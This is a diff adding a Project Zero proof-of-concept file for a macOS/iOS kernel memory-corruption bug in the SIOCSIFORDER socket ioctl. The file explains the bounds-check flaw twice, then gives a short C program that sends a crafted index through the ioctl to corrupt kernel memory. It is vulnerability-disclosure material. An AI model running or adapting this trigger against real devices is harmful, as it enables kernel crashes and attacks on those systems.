@@ -1,0 +1,113 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1108
+
+SIOCSIFORDER is a new ioctl added in iOS 10. It can be called on a regular tcp socket, so from pretty much any sandbox.
+
+it falls through to calling:
+  ifnet_reset_order(ordered_indices, ifo->ifo_count)
+where ordered_indicies points to attacker-controlled bytes.
+
+ifnet_reset_order contains this code:
+
+  for (u_int32_t order_index = 0; order_index < count; order_index++) {
+    u_int32_t interface_index = ordered_indices[order_index];  <---------------- (a)
+    if (interface_index == IFSCOPE_NONE ||
+        (int)interface_index > if_index) {           <-------------------------- (b)
+      break;
+    }
+    ifp = ifindex2ifnet[interface_index];            <-------------------------- (c)
+    if (ifp == NULL) {
+      continue;
+    }
+    ifnet_lock_exclusive(ifp);
+    TAILQ_INSERT_TAIL(&ifnet_ordered_head, ifp, if_ordered_link);    <---------- (d)
+    ifnet_lock_done(ifp);
+    if_ordered_count++;
+  }
+
+at (a) a controlled 32-bit value is read into an unsigned 32-bit variable.
+at (b) this value is cast to a signed type for a bounds check
+at (c) this value is used as an unsigned index
+
+by providing a value with the most-significant bit set making it negative when cast to a signed type
+we can pass the bounds check at (b) and lead to reading an interface pointer out-of-bounds
+below the ifindex2ifnet array.
+
+This leads very directly to memory corruption at (d) which will add the value read out of bounds to a list structure.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+
+(on 64-bit platforms the array index wouldn't wrap around so the read would actually occur > 2GB above the array, not below)
+*/
+
+// ianbeer
+#if 0
+MacOS/iOS kernel memory corruption due to Bad bounds checking in SIOCSIFORDER socket ioctl
+
+SIOCSIFORDER is a new ioctl added in iOS 10. It can be called on a regular tcp socket, so from pretty much any sandbox.
+
+it falls through to calling:
+  ifnet_reset_order(ordered_indices, ifo->ifo_count)
+where ordered_indicies points to attacker-controlled bytes.
+
+ifnet_reset_order contains this code:
+
+  for (u_int32_t order_index = 0; order_index < count; order_index++) {
+    u_int32_t interface_index = ordered_indices[order_index];  <---------------- (a)
+    if (interface_index == IFSCOPE_NONE ||
+        (int)interface_index > if_index) {           <-------------------------- (b)
+      break;
+    }
+    ifp = ifindex2ifnet[interface_index];            <-------------------------- (c)
+    if (ifp == NULL) {
+      continue;
+    }
+    ifnet_lock_exclusive(ifp);
+    TAILQ_INSERT_TAIL(&ifnet_ordered_head, ifp, if_ordered_link);    <---------- (d)
+    ifnet_lock_done(ifp);
+    if_ordered_count++;
+  }
+
+at (a) a controlled 32-bit value is read into an unsigned 32-bit variable.
+at (b) this value is cast to a signed type for a bounds check
+at (c) this value is used as an unsigned index
+
+by providing a value with the most-significant bit set making it negative when cast to a signed type
+we can pass the bounds check at (b) and lead to reading an interface pointer out-of-bounds
+below the ifindex2ifnet array.
+
+This leads very directly to memory corruption at (d) which will add the value read out of bounds to a list structure.
+
+tested on MacOS 10.12.3 (16D32) on MacbookAir5,2
+#endif
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+
+#include <mach/mach.h>
+
+struct if_order {
+	u_int32_t			ifo_count;
+	u_int32_t			ifo_reserved;
+	mach_vm_address_t	ifo_ordered_indices; /* array of u_int32_t */
+};
+
+#define SIOCSIFORDER  _IOWR('i', 178, struct if_order)
+
+int main() {
+	uint32_t data[] = {0x80001234};
+
+	struct if_order ifo;
+  ifo.ifo_count = 1;
+  ifo.ifo_reserved = 0;
+  ifo.ifo_ordered_indices = (mach_vm_address_t)data;
+
+  int fd = socket(PF_INET, SOCK_STREAM, 0);
+  int ret = ioctl(fd, SIOCSIFORDER, &ifo);
+
+  return 0;
+}
